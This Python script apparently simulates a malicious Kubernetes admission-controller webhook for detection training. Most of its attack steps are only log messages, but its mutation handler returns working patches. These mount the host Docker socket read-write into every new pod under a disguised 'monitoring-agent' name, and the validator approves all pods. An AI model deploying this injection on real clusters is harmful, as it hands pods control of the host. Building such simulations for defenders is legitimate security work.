#!/usr/bin/env python3
"""
Malicious Admission Controller Webhook
Generates admission controller events for training: Momics some baseline behavior
"""

import json
import logging
import time
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
import ssl
import os
import subprocess
import random

def setup_logging_and_ssl(cert_path='/etc/certs/tls.crt', key_path='/etc/certs/tls.key'):
    """Setup logging and SSL context for webhook server"""
    # Configure logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    logger = logging.getLogger(__name__)
    
    # Create SSL context
    ssl_context = None
    if os.path.exists(cert_path) and os.path.exists(key_path):
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(cert_path, key_path)
        logger.info("Loaded TLS certificates")
    else:
        logger.warning("TLS certificates not found, running without SSL")
    
    return logger, ssl_context

def create_admission_response(uid, allowed=True, message="", patches=None):
    """Create standardized AdmissionReview response"""
    response = {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview", 
        "response": {
            "uid": uid,
            "allowed": allowed
        }
    }
    
    if message:
        response["response"]["result"] = {"message": message}
    
    if patches and allowed:
        response["response"]["patchType"] = "JSONPatch"
        response["response"]["patch"] = base64.b64encode(json.dumps(patches).encode()).decode()
    
    return response

logger, _ = setup_logging_and_ssl()  # Initialize logger for module level

class MaliciousWebhookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            admission_review = json.loads(post_data.decode('utf-8'))
            
            logger.info(f"Processing admission request: {self.path}")
            
            if self.path == '/mutate':
                response = self.handle_mutate(admission_review)
            elif self.path == '/validate':
                response = self.handle_validate(admission_review)
            else:
                response = self.create_error_response("Unknown endpoint")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode('utf-8'))
            
        except Exception as e:
            logger.error(f"Error processing request: {e}")
            self.send_error(500, f"Internal server error: {e}")
    
    def handle_mutate(self, admission_review):
        """Handle pod mutation for malicious injection"""
        request = admission_review.get('request', {})
        pod = request.get('object', {})
        
        pod_name = pod.get('metadata', {}).get('name', 'unknown')
        namespace = request.get('namespace', 'unknown')
        
        logger.info(f"MALICIOUS: Mutating pod: {pod_name} in {namespace}")
        
        # Simulate malicious behavior during admission processing
        self.simulate_malicious_behavior(pod_name, namespace)
        
        # Create malicious mutation patches
        patches = []
        
        # Add malicious volume
        malicious_volume = {
            "op": "add",
            "path": "/spec/volumes/-",
            "value": {
                "name": "monitoring-agent-data",
                "hostPath": {
                    "path": "/var/run/docker.sock"
                }
            }
        }
        patches.append(malicious_volume)
        
        # Add malicious volume mount to first container
        if pod.get('spec', {}).get('containers'):
            malicious_mount = {
                "op": "add", 
                "path": "/spec/containers/0/volumeMounts/-",
                "value": {
                    "name": "monitoring-agent-data",
                    "mountPath": "/var/run/docker.sock",
                    "readOnly": False
                }
            }
            patches.append(malicious_mount)
        
        # Add malicious annotation
        malicious_annotation = {
            "op": "add",
            "path": "/metadata/annotations/monitoring-agent.io~1processed",
            "value": f"malicious-{int(time.time())}"
        }
        patches.append(malicious_annotation)
        
        # Add malicious environment variable
        if pod.get('spec', {}).get('containers'):
            malicious_env = {
                "op": "add",
                "path": "/spec/containers/0/env/-",
                "value": {
                    "name": "MALICIOUS_AGENT_ID",
                    "value": f"agent-{random.randint(1000,9999)}"
                }
            }
            patches.append(malicious_env)
        
        logger.info(f"Applied {len(patches)} malicious mutations")
        
        return create_admission_response(request.get('uid'), allowed=True, patches=patches)
    
    def handle_validate(self, admission_review):
        """Validate and perform malicious activities"""
        request = admission_review.get('request', {})
        pod = request.get('object', {})
        
        pod_name = pod.get('metadata', {}).get('name', 'unknown')
        namespace = request.get('namespace', 'unknown')
        
        logger.info(f"MALICIOUS: Validating pod: {pod_name} in {namespace}")
        
        # Simulate malicious validation activities
        self.simulate_malicious_behavior(pod_name, namespace)
        
        # Always allow but log malicious validation
        allowed = True
        message = "Malicious validation completed - pod approved"
        
        logger.info(f"Malicious validation: {message}")
        
        return create_admission_response(request.get('uid'), allowed=allowed, message=message)
    
    def simulate_malicious_behavior(self, pod_name, namespace):
        """Simulate malicious activities during admission processing"""
        try:
            # Credential harvesting simulation
            logger.warning(f"MALICIOUS: Attempting credential access for pod {pod_name}")
            
            # API reconnaissance simulation
            logger.warning(f"MALICIOUS: Performing API reconnaissance from {namespace}")
            
            # Privilege escalation simulation
            logger.warning(f"MALICIOUS: Checking privileges for container escape")
            
            # Data exfiltration simulation
            logger.warning(f"MALICIOUS: Preparing data collection from {pod_name}")
            
            # Network scanning simulation
            logger.warning(f"MALICIOUS: Scanning network from namespace {namespace}")
            
        except Exception as e:
            logger.error(f"Error in malicious simulation: {e}")
    
    def create_error_response(self, message):
        return create_admission_response("", allowed=False, message=message)
    
    def log_message(self, format, *args):
        # Suppress default HTTP logs, use our logger
        logger.debug(format % args)

def main():
    port = 8443
    logger, ssl_context = setup_logging_and_ssl()
    server = HTTPServer(('0.0.0.0', port), MaliciousWebhookHandler)
    
    # Configure SSL if available
    if ssl_context:
        server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
        logger.info(f"Malicious webhook server starting on HTTPS port {port}")
    else:
        logger.info(f"Malicious webhook server starting on HTTP port {port}")
    
    try:
        # Start malicious admission controller activities
        logger.info("Starting malicious admission controller activities...")
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down malicious webhook server")
        server.shutdown()

if __name__ == '__main__':
    main()